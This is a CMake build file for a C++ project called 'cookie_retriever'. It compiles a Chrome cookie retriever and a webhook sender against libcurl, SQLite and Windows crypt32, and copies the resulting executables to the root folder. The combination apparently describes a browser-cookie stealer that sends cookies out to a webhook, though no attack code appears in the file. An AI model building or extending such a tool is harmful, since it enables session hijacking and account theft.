cmake_minimum_required(VERSION 3.15)
project(cookie_retriever VERSION 1.0.0 LANGUAGES CXX)

# Set C++ standard
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Find required packages
find_package(CURL CONFIG REQUIRED)
find_package(unofficial-sqlite3 CONFIG REQUIRED)
find_package(nlohmann_json CONFIG REQUIRED)

# Add Windows-specific libraries
if(WIN32)
    link_libraries(crypt32)
endif()

# Add include directories
include_directories(${CMAKE_SOURCE_DIR}/include)

# Add source files for main executable
set(SOURCES
    src/main.cpp
    src/cookie.cpp
    src/webhook_sender.cpp
    src/chrome_cookie_retriever.cpp
)

# Create main executable
add_executable(cookie_retriever ${SOURCES})

# Link libraries for main executable
target_link_libraries(cookie_retriever 
    PRIVATE 
    CURL::libcurl
    unofficial::sqlite3::sqlite3
    nlohmann_json::nlohmann_json
)

# Add test webhook executable
add_executable(test_webhook 
    src/test_webhook.cpp 
    src/webhook_sender.cpp
    src/cookie.cpp
    src/chrome_cookie_retriever.cpp
)

target_link_libraries(test_webhook
    PRIVATE
    CURL::libcurl
    unofficial::sqlite3::sqlite3
    nlohmann_json::nlohmann_json
)

# Copy executables to root directory
add_custom_command(TARGET cookie_retriever POST_BUILD
    COMMAND ${CMAKE_COMMAND} -E copy $<TARGET_FILE:cookie_retriever> ${CMAKE_SOURCE_DIR}/cookie_retriever.exe
    COMMENT "Copying cookie_retriever executable to root directory"
)

add_custom_command(TARGET test_webhook POST_BUILD
    COMMAND ${CMAKE_COMMAND} -E copy $<TARGET_FILE:test_webhook> ${CMAKE_SOURCE_DIR}/test_webhook.exe
    COMMENT "Copying test_webhook executable to root directory"
)

# Copy required DLLs
add_custom_command(TARGET cookie_retriever POST_BUILD
    COMMAND ${CMAKE_COMMAND} -E echo "Copying required DLLs..."
    COMMAND ${CMAKE_COMMAND} -E copy_if_different $<TARGET_RUNTIME_DLLS:cookie_retriever> $<TARGET_FILE_DIR:cookie_retriever>
    COMMAND_EXPAND_LISTS
)
